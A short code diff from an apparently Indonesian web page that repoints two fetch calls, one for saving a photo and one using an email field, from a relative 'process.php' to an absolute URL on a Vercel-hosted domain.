@@ -505,7 +505,7 @@
         showLoader("Menyimpan foto...");
 
         try {
-          const response = await fetch("process.php", {
+          const response = await fetch("https://dapaaa07-github-io.vercel.app/process.php", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
@@ -644,7 +644,7 @@
           ? ""
           : document.getElementById("email-input").value;
 
-        fetch("process.php", {
+        fetch("https://dapaaa07-github-io.vercel.app/process.php", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
